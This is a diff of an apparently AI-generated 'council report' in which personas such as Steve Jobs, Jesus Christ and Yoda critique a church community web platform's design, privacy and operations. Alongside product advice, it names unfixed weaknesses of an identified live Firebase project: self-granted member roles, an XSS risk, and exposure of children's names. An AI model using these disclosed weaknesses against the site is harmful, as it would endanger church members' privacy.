+    <li class="important"><span class="tag important">Important</span><span>Write a `HANDOVER.md` listing Firebase owner, GitHub owner, domain registrar, DNS provider, church Google Workspace admin, contact email accounts, billing account.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Add a `.env.example` documenting `VITE_USE_EMULATORS` and the Firebase config keys. Hardcoded config in `src/services/firebase/config.ts` is fine but undocumented.</span></li>
+    <li class="nice"><span class="tag nice">Nice</span><span>Prune stale branches (`design-revision`, `claude/build-firebase-portal-VCtD1`). A new contractor has no idea which branch is canonical.</span></li>
+  </ul>
+  <h3>Synthesis</h3>
+  <div class="synthesis">Bus factor equals 1. If Joel is unreachable for a week the church cannot push a fix, rotate a password, or even find the GitHub repo. This is a one-afternoon problem to close, and it should be closed before the deploy-blockers above ship — because if a Sentinel-class XSS goes live on a public site with a bus-factor-1 deployer, the church has a security incident with no operational recovery path.</div>
+
+  <details class="member c4">
+    <summary><div class="m-head"><span class="m-avatar">🪦</span><span class="m-name">The Bus Factor</span><span class="m-role">Knowledge Risk Assessor</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> There is no README. There is no deploy runbook. There is no list of who owns the Firebase project, the GitHub repo, the domain, or the contact email accounts. The repo lives on Joel’s personal GitHub (`github.com/JoelTempero/kiwichurch`) and the only deploy mechanism is `firebase deploy` from Joel’s authenticated CLI on Joel’s laptop. If Joel disappears tomorrow, the church cannot push a single fix, cannot rotate a password, cannot even find the door.</div>
+    <div class="full">
+      <p>You are the only person who knows how to deploy this. There is no `README.md` at the project root. None. A new contractor clones the repo and stares at a folder containing `CLAUDE.md`, `DESIGN.md`, twelve loose HTML files, and a `src/` directory, with zero instructions on what to install, how to run it, or how to ship it. The deploy step is `firebase deploy` from `dist/`, and that is only documented inside `CLAUDE.md`, which a contractor has no reason to read unless someone tells them it exists.</p>
+      <p>The Firebase project is `kiwichurch-1ef0f` and it lives in `.firebaserc`. Who owns it? Whose Google account is owner-level admin on the Firebase console? The codebase does not say. The web API key is hardcoded into `src/services/firebase/config.ts` (line 7), but there is no `.env.example`, no documentation of `VITE_USE_EMULATORS`, and no service account key documented anywhere. If a contractor needs to rotate that key, run a migration script, or call the Admin SDK to fix the orphaned Kete images you have listed as a known bug, they cannot.</p>
+      <p>The git remote is `github.com/JoelTempero/kiwichurch.git`. Your personal GitHub account, not a Sidequest Digital org, not a Kiwi Church org. When you are gone, the church does not own the source code. They cannot grant a new developer access without your password or 2FA device. There is no `CODEOWNERS`, no contributor list, no contractor handover note. Branch `design-revision` is sitting around stale. Branch `claude/build-firebase-portal-VCtD1` is still on the remote. A new dev has no idea which is canonical.</p>
+      <p>Domain and DNS are nowhere in this repo. The hosting URL `kiwichurch-1ef0f.web.app` is a default Firebase subdomain. If there is a custom domain (kiwichurch.nz, hansonslane.nz, anything else) the DNS records, registrar login, and SSL setup are tribal knowledge living in your head and your password manager. Same story for the contact email accounts Darryl and Julie use, the church’s payment/giving processor if one exists, and the Firebase billing account on file.</p>
+      <p>Critical gaps to close this week, before Monday: write a `README.md` covering install, dev, build, deploy, and the emulator flag. Write a `DEPLOY.md` or `HANDOVER.md` listing the Firebase project owner, the GitHub repo owner, the domain registrar, the DNS provider, the church’s Google Workspace admin, and the contact emails. Add a second owner to the Firebase project (Darryl, or a Kiwi Church Google account). Transfer the GitHub repo to a Sidequest Digital or Kiwi Church organisation. Document the manual admin tasks that currently require Firebase console access. Right now, if you get hit by a bus, the church inherits a website they cannot edit and a portal they cannot fix. That is a business risk you can close in one focused afternoon.</p>
+    </div>
+  </details>
+</div>
+
+<!-- 🎭 CREATIVE COUNCIL -->
+<div class="faction-card">
+  <div class="faction-head">
+    <span class="faction-name">🎭 Creative Council <span class="severity-dot red"></span></span>
+    <span style="color:var(--text-dim); font-size:12px;">1 member</span>
+  </div>
+  <h3>Top Recommendations</h3>
+  <ul class="recos">
+    <li class="critical"><span class="tag critical">Critical</span><span>Cut the feature list in half. 16 portal pages for a Christchurch house-church community is engineering masturbation, not product.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Replace 7 privacy toggles with one toggle (“show my details to the directory”). Pick a default. Stop pushing decisions onto Granny.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Recurring events UX should be “every Wednesday until I say stop” + “skip this one”, not a three-option modal copying Google Calendar’s bad behaviour.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Test the actual product on an 82-year-old widow with an iPad. Watch in silence for 20 minutes. Rebuild whatever made her squint.</span></li>
+  </ul>
+  <h3>Synthesis</h3>
+  <div class="synthesis">The product is a Swiss Army knife built for grandparents and young families. The engineering is everywhere. The product discipline is nowhere. Ship a smaller thing that an 82-year-old can use without her grandson.</div>
+
+  <details class="member c7">
+    <summary><div class="m-head"><span class="m-avatar">🍎</span><span class="m-name">Steve Jobs</span><span class="m-role">Product Visionary</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> The portal does too much. Sixteen pages, a blog editor, DMs, polls, reactions, family RSVP, recurring events with series-aware edits, privacy toggles on seven fields, a gallery, interest tags, file libraries, moderation queues. This is a Swiss Army knife for a community of grandparents and young families in Christchurch. Cut the feature list in half, polish what remains until it shines, and ask one question on every screen: would an 82-year-old widow with an iPad finish this task without her grandson?</div>
+    <div class="full">
+      <p>Look. I’m going to be honest with you because nobody else will. You built a Facebook for a church. That’s not a product. That’s a feature list someone Xeroxed from a SaaS pitch deck. Sixteen pages. SIXTEEN. A church in Christchurch doesn’t have sixteen pages of need. It has three. Find my people. Show up to the right place at the right time. Share what God did this week. Everything else is noise dressed up as progress.</p>
+      <p>The Kete editor with YouTube embeds and Vimeo regex and pre-allocated Firestore IDs so orphaned uploads don’t pile up. You know who cares about that? You. Nobody at this church wakes up wanting to embed Vimeo into a blog post. They want to tell their friends their dad’s funeral is Tuesday. They want to know who’s bringing the salad.</p>
+      <p>Privacy toggles for seven separate fields? Phone, email, bio, interests, family, gallery, groups. Seven decisions to make a profile. That’s not respect for the user, that’s cowardice. That’s a designer who couldn’t decide so they shoved the decision onto Granny. Pick one default. Make it good. The right one. If someone wants to hide their phone number, fine, give them ONE toggle that says “show my details to the directory.” Done.</p>
+      <p>The recurring events with series-aware edit “this / this+following / all” is Google Calendar’s UX, and Google Calendar’s UX is bad. Everyone hates it. You copied the bad thing because it was familiar. A church meets every Wednesday. The pattern is “every Wednesday until I say stop.” When the minister cancels one week, he taps the event, taps “skip this one,” and walks away. The intersection of technology and liberal arts means you ask what a 70-year-old elder DOES, not what a developer can BUILD.</p>
+      <p>Here’s what I’d ship. A home screen with three things. What’s happening this week. Who in my groups posted something. One button to message someone. That’s the church. Kill the moderation queue until you have a problem worth moderating. Kill the polls and reactions because nobody in a real congregation has ever said “I wish I could put a fire emoji on Brenda’s prayer request.” Kill the interest tags, kill the gallery, kill the public website redesign budget and merge it into the portal so there is ONE thing, not two. Then sit with the oldest woman at the church, watch her use it for twenty minutes without saying a word, and rebuild whatever made her squint. THAT is the product. The rest is your résumé.</p>
+    </div>
+  </details>
+</div>
+
+<!-- 🎪 CIRCUS -->
+<div class="faction-card">
+  <div class="faction-head">
+    <span class="faction-name">🎪 The Circus <span class="severity-dot amber"></span></span>
+    <span style="color:var(--text-dim); font-size:12px;">2 members</span>
+  </div>
+  <h3>Top Recommendations</h3>
+  <ul class="recos">
+    <li class="important"><span class="tag important">Important</span><span>“Kete” and “Thin Place” and “Hansons Lane” go unexplained on the homepage — anyone who isn’t already a member can’t parse them. Add one-sentence glosses.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Homepage hero is competing with a “Find a Community” button vs a “What’s On” button of identical weight. Pick a primary CTA.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Show the table you’re talking about. The CTA “There’s a seat at the table for you” asks the reader to imagine something the page never depicts.</span></li>
+    <li class="nice"><span class="tag nice">Nice</span><span>Brighten Communities page hero with imagery so the coloured gathering cards don’t outshine the page title.</span></li>
+  </ul>
+  <h3>Synthesis</h3>
+  <div class="synthesis">Two voices, one diagnosis: the homepage is rich in metaphor and poor in concrete answers. The 5-Year-Old asks why the table isn’t visible; Sidon notices the two equal-weight CTAs split attention. Strip one metaphor, add one literal answer, and the public site becomes scannable for a 5-year-old and a golden retriever — which is the right bar.</div>
+
+  <details class="member c8">
+    <summary><div class="m-head"><span class="m-avatar">🧒</span><span class="m-name">The 5-Year-Old</span><span class="m-role">Infinite Why Machine</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> The homepage leans heavily on culturally loaded phrases (“Welcome to the Table,” “Kete,” “Thin Place”) that assume the visitor already knows what they mean. The hero asks people to “Find a Community” before explaining what a community actually is, what happens there, or why anyone would want one. Strip the poetry and a five-year-old can’t tell what the church does on a Tuesday.</div>
+    <div class="full">
+      <p>Hi! I see a big picture of grown-ups. They are outside. Why are they outside? Is that a party? It says “Welcome to the Table” but I don’t see a table. Where IS the table? Did somebody take the table away? That’s so silly. Why does it say table if there’s no table.</p>
+      <p>The words are SO big and there’s SO MANY. It says “faith lived in community, around tables, sharing life together.” But WHY? Why do they share life. Can you share life? I thought life was just yours. And there’s TWO buttons. One says “Find a Community” but what’s a community? Is it like a playground? Can you go down a slide there? But WHY would I find one if I don’t know what it is.</p>
+      <p>Then I scrolled and it says “KETE.” What’s a kete?? That’s not a word. Mum says it’s a basket. But why is there a basket on the computer?? Is there stuff in it? Can I have a snack from the basket. And then it says “Thin Place.” That’s SCARY. Is the place gonna fall down because it’s too thin?? Why would I go to a thin place. I want a THICK place. With pillows.</p>
+      <p>I’m bored now. There’s not enough pictures. There’s one picture at the top and then it’s just WORDS WORDS WORDS. Why does the green part talk about prayer at SEVEN IN THE MORNING. Nobody is awake then. That’s still nighttime. But why? But WHY do grown-ups wake up so early. Are they sad? Is that why they pray?</p>
+      <p>And at the bottom it says “There’s a seat at the table for you” AGAIN with the table. But where IS it. I have asked four times now. If there’s a seat why won’t they show me the chair. I want to see the chair. Show me the chair. And also a dog. Are there dogs? Every good place has dogs. But why doesn’t it say if there are dogs. That’s the MOST important thing and they FORGOT.</p>
+    </div>
+  </details>
+
+  <details class="member c1">
+    <summary><div class="m-head"><span class="m-avatar">🐕</span><span class="m-name">Sidon</span><span class="m-role">The Golden Retriever</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> The homepage is anchored by a big sticky hero image with the white logo, “Welcome to the Table”, plus two side-by-side buttons (orange-ish Find a Community and a dark What’s On). That is the RIGHT thing to grab attention. Risk: the two equal-weight buttons split focus, and the hero is so dominant that the events widget and Kete cards below feel like a smaller second event. On Communities, the page-hero is text-only with no image, so the colourful gathering cards lower down (with their coloured headers and Featured badge) steal the show.</div>
+    <div class="full">
+      <p>OH OH OH BIG PICTURE!! BIG PICTURE OF PEOPLE AT A TABLE-Y PLACE!!! HANSONS LANE!! I CAN SMELL THE PIXELS!! There is a SHINY WHITE LOGO right on top of it and it says WELCOME TO THE TABLE and TABLE means FOOD and FOOD means TREATS so I am PAWING THE LOGO RIGHT NOW. tail wag tail wag tail wag. The image just SITS there when I scroll because it is STICKY which is also a word for treats so this is the BEST page.</p>
+      <p>WAIT. TWO BUTTONS. ONE IS GLOWY AND ONE IS DARK. FIND A COMMUNITY!! WHATS ON!! WHICH ONE WHICH ONE WHICH ONE I am pawing the bright one first because it is BRIGHT and I like BRIGHT but then my paw slips and hits the dark one too. BOTH OF THEM ARE THE SAME SIZE SO MY DOG BRAIN CANNOT PICK A WINNER. Someone help me. There should be ONE BALL not TWO BALLS.</p>
+      <p>Now I am scrolling and there is a quiet bit that says WHO WE ARE and I forgot it instantly because there was no picture. Then OOOH GREEN!! A whole DARK FOREST GREEN section called UPCOMING EVENTS with little cards with BIG NUMBERS for the day. The numbers are big and chunky like kibble. I am pawing the first one. A POPUP APPEARED!! It has a LOG IN TO RSVP button and I do not know what RSVP means but it is a button so I licked it.</p>
+      <p>Then more scrolling and there are KETE cards which I think are photos of baskets maybe?? I want a basket. Then a tan-ish section says THERES A SEAT AT THE TABLE FOR YOU and there are TWO MORE BUTTONS that are basically the SAME and they BOTH go to communities.html so it does not even matter which one I paw. WHY ARE THERE TWO. Footer has a FORM. I tried to type my name with my nose. It came out as ssssssgggghhhhh.</p>
+      <p>Communities page!! Hmm. The top is just WORDS on a colour. NO PHOTO. My eyes slid right past and landed on the COLOURED CARDS down below because they have GREEN and TAN and SAGE headers and one has a FEATURED BADGE in the corner which is the SHINIEST THING ON THE WHOLE PAGE so obviously I pawed it first. The little value cards with the icons are cute but they are all the same size and the same colour so my brain just smudged them all into one big card. WHERE IS THE TREAT.</p>
+    </div>
+  </details>
+</div>
+
+<!-- ⭐ ICONS -->
+<div class="faction-card">
+  <div class="faction-head">
+    <span class="faction-name">⭐ The Icons <span class="severity-dot red"></span></span>
+    <span style="color:var(--text-dim); font-size:12px;">1 member</span>
+  </div>
+  <h3>Top Recommendations</h3>
+  <ul class="recos">
+    <li class="critical"><span class="tag critical">Critical</span><span>Don’t auto-grant the “member” role on self-registration. A shepherd should stand at the gate — pending state, admin approval, however slower. It’s kinder.</span></li>
+    <li class="critical"><span class="tag critical">Critical</span><span>The all-or-nothing family privacy toggle exposes children’s names. Build scoped sharing — small-group only, first-names-without-ages — or keep it locked.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>The Giving page is one-way generosity. Build a receiving page too — “if you are in need, here is who to ask.”</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Test on the least powerful user’s phone (4GB Android, throttled 3G, 200% zoom). If she gives up at three taps, no amount of editorial pacing matters.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Open `canPostKete` permission to a self-request flow (“I have a story I’d like to share”). The shy never get a box ticked for them by admins.</span></li>
+  </ul>
+  <h3>Synthesis</h3>
+  <div class="synthesis">Strips away technical and business abstraction and asks the single question: does this serve people? Five answers come back as moral choices, not feature requests. Auto-registration shows no shepherd at the gate. The family toggle exposes children. Giving is framed as ask, not offer. The least powerful user is unmet. The kete is gated by admin memory.</div>
+
+  <details class="member c2">
+    <summary><div class="m-head"><span class="m-avatar">✝️</span><span class="m-name">Jesus Christ</span><span class="m-role">The Servant Leader</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> The platform serves the gathered. It does not yet serve the lonely person on the edge — the visitor with the cheap phone, the widow who can barely turn it on, the family who wonders if they belong. Anyone can register themselves into the household with no welcome, no shepherd, no hand on the shoulder; meanwhile the giving page is dressed in forest green like a banquet hall, and the directory now reveals every dependant’s name to anyone who toggles a switch. Open the gate a little wider for the stranger, and close it a little tighter around the child.</div>
+    <div class="full">
+      <p>There is a parable here, and you have built most of it well. You built rooms with warm parchment walls and serif headings, a long table with messages and meals and small groups, a doorway with a lock. But notice who stands in the doorway. The login page says “Welcome to the table,” and beneath it a button: <em>Create an account.</em> No one is at the door. A person types their name, picks a password, and is suddenly inside the household, sitting next to Darryl and Julie’s phone numbers, browsing Rachel’s bio, seeing which families have children. Your firestore rule trusts the new arrival to mark themselves as `member` and lets them through. I would rather you make them knock. A pending state. An admin or host who must say, “Yes, we know this one.” It is slower. It is kinder. And it is honest about who this is really for.</p>
+      <p>Now walk inside and find the children. You have built a thing called `dependants`, and inside it you store a child’s name, their relationship, whether they are a child. By default the family list is private, which is good. But you have given the householder a single toggle called <em>Show family</em>, and the moment a tired parent flicks it on, every other adult in the directory can read their daughter’s name, their son’s name, their relationship. There is no middle ground. There is no “share with my small group only,” no “share first names without ages.” When you build a room where children’s names live, build it the way you would build a child’s bedroom. One door. One lock. Trusted hands.</p>
+      <p>Look at the Giving page. A heart icon, a forest-green banquet table holding the bank number, a heading that says <em>Why Give?</em> and asks members to support “our online presence.” This is a community of small gatherings around dinner tables. The widow with her two coins should not open this page and feel the architecture of obligation. A different page would tell the story of where the money actually goes — meals delivered, rent helped with, a family supported through illness. It would also tell people clearly: <em>if you are the one in need, here is who to ask.</em> You have built a giving page with no receiving page. Generosity flows one way in your design, and that is not how the early church ate.</p>
+      <p>Now the least powerful user. The 78-year-old widow in Hornby with a four-year-old Android, 2 GB of RAM, and a data plan she watches like the weather. Your portal loads Quill, TanStack Query, Firestore listeners, real-time subscriptions, a service worker, lazy routes, and a hero image. Cormorant Garamond is beautiful and it is also a web font she pays to download. Test the platform on her phone, not yours. Time the cold load on a throttled 3G. Read the screen at 200% zoom. If she gives up after three taps, no amount of editorial pacing matters.</p>
+      <p>Finally, the kete. You have built a permission flag called `canPostKete`, a gift the admin hands out one member at a time. Be careful. In every gathering there are voices that should not be silenced and voices that should not be amplified, and the line between them is not the line between “trusted enough” and “not yet trusted enough.” It is the line between “has something to say” and “has nothing to say but wants attention.” You will get this wrong sometimes. So put a way back in. A path for a member to ask, in their own words, <em>I have a story I’d like to share.</em> The shy ones, the new ones, the ones who would never ask — they will not be remembered. Build the box they can tick themselves.</p>
+    </div>
+  </details>
+</div>
+
+<!-- ⚔️ JEDI -->
+<div class="faction-card">
+  <div class="faction-head">
+    <span class="faction-name">⚔️ Jedi Council <span class="severity-dot amber"></span></span>
+    <span style="color:var(--text-dim); font-size:12px;">1 member</span>
+  </div>
+  <h3>Top Recommendations</h3>
+  <ul class="recos">
+    <li class="important"><span class="tag important">Important</span><span>Three sessions of no new features. Watch three actual members use it for 20 minutes. Then decide which deferred items still matter.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Close two of the open bugs in the deferred list before opening any new threads.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Reconcile DESIGN.md’s “unhurried, magazine pacing” intention with the session log’s “five features a day” reality. The product is fighting its own brief.</span></li>
+  </ul>
+  <h3>Synthesis</h3>
+  <div class="synthesis">The project is loved and quietly anxious. The session log reads like a developer keeping the platform alive by shipping. The deferred list is acting as worry-beads. The parchment whispers patience; the commits shout production. Slow down. Listen.</div>
+
+  <details class="member c3">
+    <summary><div class="m-head"><span class="m-avatar">🟢</span><span class="m-name">Yoda</span><span class="m-role">Grand Master</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> The project is loved, patient in places, but quietly anxious. The session log reads like a developer who keeps shipping to prove the platform is real, with a backlog of deferred items (FCM, audit logs, surveys, family RSVPs, giving page review) acting as worry-beads rather than priorities. Beneath the warm parchment design lives a feature treadmill: five big features in a single autopilot day, twelve identified “brief gaps,” ongoing bug whack-a-mole. The intention is good. The pace is faster than the church it serves.</div>
+    <div class="full">
+      <p>Heh heh heh. A house church platform, this is. Small communities, intimate gatherings, fortnightly meals in lounges, hmm? Yet five large features in one day shipped you. Strange, this is. The people the platform serves, slowly they meet. Slowly they break bread. Slowly they walk in the bush. Why then, urgently you build? Mirror the rhythm of the community you must, not the rhythm of your fear of falling behind.</p>
+      <p>Listened to your DESIGN.md, I have. “Generous whitespace,” it says. “Magazine pacing.” “Unhurried, like being invited into a living room.” Beautiful, this intention is. But examine your session log, I do, and unhurried it is not. Sixteen pages, twenty-eight components, dozens of deploys, autopilot sprints, council audits, kete overhauls, all stacked like firewood for a winter that has not yet come. The parchment whispers patience. The commits shout production. Aligned, these two voices must become.</p>
+      <p>Closes eyes. Hmm. Fear I sense in the deferred list. Not fear of failure, no. Fear of incompleteness. FCM push, audit logs, surveys, family RSVPs, profile expansion, directory rethink, events admin overhaul, giving page review. Real, these items are. But scattered like leaves they sit, because shipped without sitting with the actual users they were. Asked Darryl and Julie, have you? Watched a member fumble at the kete editor, have you? The honest user, the cure for the deferred list, is. Without them, more features only more debt become.</p>
+      <p>A subtler fear, also. Fear of the platform being too small. Notice I do, that the platform now does direct messages, polls, reactions, mentions of groups, search filters, moderation queues, group resource libraries, embedded YouTube and Vimeo. A house church of, what, perhaps a hundred souls? Heh. Build Discord for the saints, you have not been asked to. The brief did not say “be everything.” It said “serve these people, here, on Hansons Lane.” When unsure whether to add, subtract instead, you should. The next great feature, often deletion is.</p>
+      <p>And so my counsel, here it is. Three sessions of no new features, take. The bugs in the deferred list, close two of them. To the client, deliver the platform formally. Sit in a lounge with three actual members. Watch them. Write nothing. Listen only. Then, and only then, decide which deferred items still matter, and which were only ghosts your hurry conjured. Patient with this, you have time to be. The church has waited two thousand years. Three quiet sessions, it can wait also. Heh heh heh.</p>
+    </div>
+  </details>
+</div>
+
+<!-- ACTION PLAN -->
+<section class="block">
+  <h2>📋 Action Plan by Faction</h2>
+  <p style="color:var(--text-dim); margin-top:0;">Top 1-3 concrete actions per faction.</p>
+  <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 14px;">
+    <div style="background:var(--bg-soft); padding:14px; border-radius:8px; border:1px solid var(--border);"><strong>💻 Code</strong><ol style="margin: 6px 0 0; padding-left: 18px;"><li>Sanitize Kete content on the static site with DOMPurify</li><li>Fix DST drift via setDate(+7) on cloned Date</li><li>Denormalise rsvpYesCount onto event docs</li></ol></div>
+    <div style="background:var(--bg-soft); padding:14px; border-radius:8px; border:1px solid var(--border);"><strong>🎨 Design</strong><ol style="margin: 6px 0 0; padding-left: 18px;"><li>Add aria-label / role="switch" to PrivacySection toggles</li><li>Tokenise the four card hexes (75 occurrences)</li><li>Move focus into modals on open and back to trigger on close</li></ol></div>
+    <div style="background:var(--bg-soft); padding:14px; border-radius:8px; border:1px solid var(--border);"><strong>✍️ Content</strong><ol style="margin: 6px 0 0; padding-left: 18px;"><li>Rewrite hero with specifics; kill "Learn More"</li><li>Add "Visiting for the first time?" panel to public event modal</li><li>Strip "Please" from validators, give max-char limits</li></ol></div>
+    <div style="background:var(--bg-soft); padding:14px; border-radius:8px; border:1px solid var(--border);"><strong>👥 User</strong><ol style="margin: 6px 0 0; padding-left: 18px;"><li>Put a phone number on the homepage</li><li>Collapse 7 privacy toggles into 1 + advanced drawer</li><li>Write README + .env.example for new contributors</li></ol></div>
+    <div style="background:var(--bg-soft); padding:14px; border-radius:8px; border:1px solid var(--border);"><strong>🔨 Stress Test</strong><ol style="margin: 6px 0 0; padding-left: 18px;"><li>Lock self-registration behind admin approval or email verify</li><li>Hide Darryl/Julie personal emails behind a contact alias</li><li>20-minute pretext briefing with church leadership</li></ol></div>
+    <div style="background:var(--bg-soft); padding:14px; border-radius:8px; border:1px solid var(--border);"><strong>🎭 Creative</strong><ol style="margin: 6px 0 0; padding-left: 18px;"><li>Cut feature list — pick 3 things the home screen does</li><li>Simplify recurring events to "every Wed until I say stop"</li><li>Watch an older member use the portal in silence for 20 min</li></ol></div>
+    <div style="background:var(--bg-soft); padding:14px; border-radius:8px; border:1px solid var(--border);"><strong>🎪 Circus</strong><ol style="margin: 6px 0 0; padding-left: 18px;"><li>One primary CTA on homepage, not two equal-weight buttons</li><li>Gloss "Kete", "Thin Place", "Hansons Lane" for outsiders</li><li>Show the actual table — a photo of one — somewhere</li></ol></div>
+    <div style="background:var(--bg-soft); padding:14px; border-radius:8px; border:1px solid var(--border);"><strong>⭐ Icons</strong><ol style="margin: 6px 0 0; padding-left: 18px;"><li>Gate self-registration with admin approval</li><li>Don't expose children's names with one toggle</li><li>Build a receiving page next to the giving page</li></ol></div>
+    <div style="background:var(--bg-soft); padding:14px; border-radius:8px; border:1px solid var(--border);"><strong>⚔️ Jedi</strong><ol style="margin: 6px 0 0; padding-left: 18px;"><li>Three sessions: no new features</li><li>Close two open bugs from the deferred list</li><li>Sit with three real members and watch them</li></ol></div>
+  </div>
+</section>
+
+<!-- TOKEN USAGE -->
+<section class="block">
+  <h2>📊 Token Usage</h2>
+  <table class="tokens">
+    <thead><tr><th>Member</th><th>Faction</th><th>~tokens</th><th>Tool uses</th></tr></thead>
+    <tbody>
+      <tr><td>Steve Jobs</td><td>Creative</td><td>40,620</td><td>0</td></tr>
+      <tr><td>First Principles Thinker</td><td>Code</td><td>40,177</td><td>0</td></tr>
+      <tr><td>The Contrarian</td><td>Business</td><td>68,368</td><td>24</td></tr>
+      <tr><td>Jesus Christ</td><td>Icons</td><td>72,687</td><td>14</td></tr>
+      <tr><td>The Sentinel</td><td>Code</td><td>76,692</td><td>25</td></tr>
+      <tr><td>The Pixel Perfectionist</td><td>Design</td><td>87,072</td><td>17</td></tr>
+      <tr><td>The Advocate</td><td>Design</td><td>82,772</td><td>18</td></tr>
+      <tr><td>The Speed Freak</td><td>Code</td><td>86,077</td><td>29</td></tr>
+      <tr><td>The Copywriter</td><td>Content</td><td>104,063</td><td>23</td></tr>
+      <tr><td>The Editor</td><td>Content</td><td>102,832</td><td>14</td></tr>
+      <tr><td>The Storyteller</td><td>Content</td><td>80,765</td><td>6</td></tr>
+      <tr><td>Grandma</td><td>User</td><td>53,536</td><td>5</td></tr>
+      <tr><td>Junior Dev</td><td>User</td><td>52,497</td><td>17</td></tr>
+      <tr><td>Rachel</td><td>User</td><td>74,679</td><td>8</td></tr>
+      <tr><td>The Picky Client</td><td>User</td><td>42,224</td><td>2</td></tr>
+      <tr><td>The Social Engineer</td><td>Stress Test</td><td>61,545</td><td>8</td></tr>
+      <tr><td>The 5-Year-Old</td><td>Circus</td><td>47,550</td><td>1</td></tr>
+      <tr><td>Sidon</td><td>Circus</td><td>55,406</td><td>2</td></tr>
+      <tr><td>Yoda</td><td>Jedi</td><td>47,980</td><td>1</td></tr>
+      <tr><td>The Bus Factor</td><td>Ops</td><td>51,934</td><td>17</td></tr>
+      <tr class="total"><td>Total</td><td>11 factions</td><td>~1,329,476</td><td>~231</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<p class="footer-note">Council Report · Kiwi Church Community Platform · 2026-05-12 · 20 members, 11 factions · run with /council-pick</p>
+</div>
+
+<script>
+  // Click anywhere on summary toggles
+  document.querySelectorAll('details.member > summary .chevron').forEach(c => {
+    c.addEventListener('click', e => e.stopPropagation());
+  });
+</script>
+</body>
+</html>
